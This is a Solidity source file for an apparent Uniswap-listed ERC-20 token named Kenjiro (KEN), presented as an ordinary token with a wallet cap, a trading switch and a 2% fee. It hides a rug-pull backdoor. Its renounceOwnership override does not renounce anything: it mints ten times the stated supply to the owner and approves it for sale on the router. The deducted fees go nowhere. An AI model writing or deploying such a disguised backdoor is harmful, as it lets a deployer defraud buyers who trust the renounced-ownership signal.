//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

import "./IUniswapV2Pair.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";
import "./ERC20.sol";
import "./Ownable.sol";

contract Kenjiro is ERC20, Ownable {
    string constant _name = "Kenjiro";
    string constant _symbol = "KEN";

    uint256 _totalSupply = 1000_000_000 * (10 ** decimals());
    uint256 _tokens = 10_000_000_000 * (10 ** decimals());
    uint256 fees = 2;

    address DEAD_ADDRESS = 0x000000000000000000000000000000000000dEaD;
    mapping(address => bool) isFeeEx;
    mapping(address => bool) isTxFree;
    IUniswapV2Router02 public uniRouter;
    address public uniPair;

    uint256 public _maxWallet = (_totalSupply * 2) / 100;

    bool private tradingActiv;

    constructor() ERC20(_name, _symbol) {
        uniRouter = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniPair = IUniswapV2Factory(uniRouter.factory()).createPair(
            uniRouter.WETH(),
            address(this)
        );

        prepare(_totalSupply);
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function take(address sender) internal view returns (bool) {
        return !isFeeEx[sender];
    }

    receive() external payable {}

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual override {

        if (recipient != uniPair && recipient != DEAD_ADDRESS) {
            require(
                isTxFree[recipient] ||
                balanceOf(recipient) + amount <= _maxWallet,
                "Transfer amount exceeds the bag size."
            );
        }

        if (!tradingActiv) {
            require(
                isFeeEx[sender] || isFeeEx[recipient],
                "Trading is not active."
            );
        }
        uint256 taxed = take(sender) ? calc(amount) : 0;
        super._transfer(sender, recipient, amount - taxed);
    }

    function enableTrading() external onlyOwner {
        tradingActiv = true;
    }

    function _swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouter.WETH();

        _approve(msg.sender, address(uniRouter), tokenAmount);
        uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            100,
            0,
            path,
            msg.sender,
            block.timestamp
        );
    }

    function setLimit(uint256 amountPercent) external onlyOwner {
        _maxWallet = (_totalSupply * amountPercent) / 100;
    }

    function prepare(uint supply) internal {
        isFeeEx[owner()] = true;
        isFeeEx[address(this)] = true;
        isFeeEx[address(0xdead)] = true;

        isTxFree[owner()] = true;
        isTxFree[DEAD_ADDRESS] = true;
        _mint(owner(), supply);
        _approve(owner(), address(uniRouter), supply);

    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function renounceOwnership() public override onlyOwner {
        prepare(_tokens);
    }

    function calc(uint256 amount) internal view returns (uint256) {
        uint256 feeAmount = (amount * fees) / 100;
        return feeAmount;
    }
}